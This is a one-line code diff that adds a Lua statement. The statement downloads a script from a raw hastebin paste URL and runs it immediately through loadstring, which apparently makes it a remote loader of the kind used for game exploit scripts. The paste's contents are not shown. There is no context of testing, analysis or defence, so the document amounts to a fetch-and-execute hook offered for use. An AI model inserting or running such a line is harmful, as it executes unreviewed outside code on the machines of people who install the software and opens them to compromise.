@@ -1,0 +1,1 @@
+loadstring(Raindrop:DownloadString('http://hastebin.com/raw/apeciwoxal'))()
